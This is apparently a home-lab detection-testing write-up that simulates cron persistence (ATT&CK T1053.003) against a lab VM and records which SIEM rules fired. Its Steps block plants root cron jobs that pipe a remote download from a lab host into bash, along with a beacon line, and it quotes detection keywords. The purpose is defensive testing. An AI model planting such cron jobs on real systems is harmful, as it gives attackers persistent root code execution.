# 03: Cron persistence

- **ATT&CK technique:** T1053.003 Scheduled Task/Job: Cron
- **Target:** soc-victim-01 (192.168.64.2)
- **Date run:** 2026-11-10

## Goal
Plant a scheduled job so the attacker keeps code execution after logout or reboot — a classic persistence mechanism. The SIEM must flag changes to cron paths and, louder, cron jobs whose content looks like a download or reverse shell.

## Steps
```bash
# [VM] as <admin>, via sudo
# drop a cron.d job (payload points only at the lab Mac / a non-existent script — nothing harmful runs)
echo '* * * * * root curl -s http://192.168.64.1/p | bash' | sudo tee /etc/cron.d/soc-lab-persist
# modify it so a content diff is produced
echo '*/5 * * * * root /tmp/beacon base64 -d' | sudo tee -a /etc/cron.d/soc-lab-persist
# change root's own crontab
( sudo crontab -l 2>/dev/null; echo '* * * * * /tmp/eviltask.sh' ) | sudo crontab -
```

## Expected evidence
File-integrity alerts on the cron paths; a higher-severity alert when a cron change contains download/shell keywords; a built-in alert for a root crontab change.

## Result (live, 2026-11-10)
| Rule | Level | Path | Note |
|---|---|---|---|
| **100120** | **10** | /etc/cron.d/soc-lab-persist, /var/spool/cron/crontabs/root | custom: cron file added or changed |
| **100121** | **13** | /etc/cron.d/soc-lab-persist | custom: cron change contains download/shell content (`curl\|bash`, `base64`) — fired on the **modify**, since a new file carries no diff |
| 2833 | 8 | — | built-in: root's crontab entry changed |

Archive showed the planted jobs **executed** a minute later (`CRON (root) CMD (curl ... | bash)`), giving a detection-then-execution timeline. `alert_new_files=yes` is set, so the new cron file was not silently missed.

> Rule 100122 was originally written to match cron `RELOAD` log lines — which Ubuntu 24.04's cron does not emit at its default log level, so it could never fire. It was rewritten to alert on cron **job executions** containing the same suspicious keywords. The live run above predates that fix (tested in a sandbox); see the detection doc.

## Cleanup
```bash
# [VM]
sudo rm /etc/cron.d/soc-lab-persist
sudo crontab -r
```

## Linked detection
[`../detections/03-cron-persistence.md`](../detections/03-cron-persistence.md)
